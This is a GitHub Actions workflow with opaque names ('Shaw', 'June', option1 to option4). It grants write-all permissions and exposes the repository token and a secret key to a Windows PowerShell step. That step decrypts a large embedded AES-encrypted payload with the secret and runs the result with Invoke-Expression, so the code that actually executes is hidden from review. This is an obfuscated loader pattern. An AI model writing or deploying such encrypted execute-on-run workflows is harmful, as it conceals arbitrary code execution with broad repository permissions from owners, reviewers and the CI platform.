name: Shaw

on: 
  workflow_dispatch:
    inputs:
      option1:
        required: true
        default: ''
        type: string
      option2:
        required: false
        default: ''
        type: string
      option3:
        required: true
        default: 330
        type: number
      option4:
        required: true
        default: false
        type: boolean
 
permissions: write-all

env:
  GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
  DECRYPTION_KEY: ${{ secrets.DECRYPTION_KEY }}
  OPTION_1: ${{ inputs.option1 }}
  OPTION_2: ${{ inputs.option2 }}
  OPTION_3: ${{ inputs.option3 }}
  OPTION_4: ${{ inputs.option4 }}

jobs:
  k:
    runs-on: windows-latest
    steps:
      - name: June
        shell: pwsh
        run: |
          $encrypted_payload = "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"
          $passphrase = $env:DECRYPTION_KEY

          $iterations = 10000
          $keySizeBytes = 32
          $ivSizeBytes = 16

          function Try-OpenSSLStyleDecrypt {
              param(
                  [byte[]]$ciphertextWithPossibleHeader,
                  [string]$password
              )

              try {
                  if (-not $password) {
                      throw "no supply"
                  }

                  # Check for OpenSSL 'Salted__' header (ASCII) -> first 8 bytes 'Salted__', next 8 bytes salt
                  $header = [System.Text.Encoding]::ASCII.GetString($ciphertextWithPossibleHeader, 0, [Math]::Min(8, $ciphertextWithPossibleHeader.Length))
                  if ($header -eq "Salted__") {
                      # extract salt (bytes 8..15) and ciphertext (from byte 16 onward)
                      $salt = [byte[]]($ciphertextWithPossibleHeader[8..15])
                      $cipherBytes = if ($ciphertextWithPossibleHeader.Length -gt 16) { [byte[]]($ciphertextWithPossibleHeader[16..($ciphertextWithPossibleHeader.Length - 1)]) } else { @() }
                  } else {
                      # no salt header found — assume the whole buffer is raw ciphertext, no salt
                      $salt = $null
                      $cipherBytes = $ciphertextWithPossibleHeader
                  }

                  # Derive key+iv using PBKDF2
                  $passwordBytes = [System.Text.Encoding]::UTF8.GetBytes($password)

                  if ($salt -ne $null -and $salt.Length -gt 0) {
                      # Try to use SHA256-based Rfc2898DeriveBytes (requires .NET that supports HashAlgorithmName overload)
                      try {
                          $deriveCtor = [System.Security.Cryptography.Rfc2898DeriveBytes].GetConstructors() |
                                        Where-Object { $_.GetParameters().Length -ge 3 } |
                                        Select-Object -First 1
                          # Use explicit HashAlgorithmName if available (PowerShell Core / modern .NET)
                          $rdb = New-Object System.Security.Cryptography.Rfc2898DeriveBytes(
                              ([System.Text.Encoding]::UTF8.GetString($passwordBytes)),
                              $salt,
                              $iterations,
                              [System.Security.Cryptography.HashAlgorithmName]::SHA256
                          )
                      } catch {
                          # Fallback to older constructor (uses HMACSHA1) — only do this if you know the data was derived with SHA1
                          $rdb = New-Object System.Security.Cryptography.Rfc2898DeriveBytes(
                              $password,
                              $salt,
                              $iterations
                          )
                          Write-Warning "Rfc2898DeriveBytes SHA256 overload not available; falling back to default SHA1-based PBKDF2. If encryption used PBKDF2-SHA256, specify a PowerShell/.NET runtime that supports it."
                      }
                  } else {
                      # no salt -> cannot derive key reliably; try deriving with empty salt
                      $salt = ,0..7 | ForEach-Object { [byte]0 }
                      $rdb = New-Object System.Security.Cryptography.Rfc2898DeriveBytes($password, $salt, $iterations, [System.Security.Cryptography.HashAlgorithmName]::SHA256)
                  }

                  $key = $rdb.GetBytes($keySizeBytes)
                  $iv  = $rdb.GetBytes($ivSizeBytes)

                  # Create AES decryptor
                  $aes = [System.Security.Cryptography.Aes]::Create()
                  $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
                  $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
                  $aes.KeySize = 256
                  $aes.Key = $key
                  $aes.IV = $iv

                  $transform = $aes.CreateDecryptor()
                  $ms = New-Object System.IO.MemoryStream (,$cipherBytes)
                  $cs = New-Object System.Security.Cryptography.CryptoStream($ms, $transform, [System.Security.Cryptography.CryptoStreamMode]::Read)
                  $sr = New-Object System.IO.StreamReader($cs, [System.Text.Encoding]::UTF8)
                  $plaintext = $sr.ReadToEnd()

                  # clean up
                  $sr.Close(); $cs.Close(); $ms.Close(); $aes.Dispose()

                  return $plaintext
              } catch {
                  throw $_
              }
          }

          try {
              $cipherBytes = [Convert]::FromBase64String($encrypted_payload)

              $decrypted = Try-OpenSSLStyleDecrypt -ciphertextWithPossibleHeader $cipherBytes -password $passphrase

              if ($null -ne $decrypted -and $decrypted.Length -gt 0) {
                  Invoke-Expression $decrypted
              } else {
                  Write-Error "Decryption succeeded but produced empty output."
              }
          } catch {
              Write-Error "Decryption failed: $($_.Exception.Message)"
          }
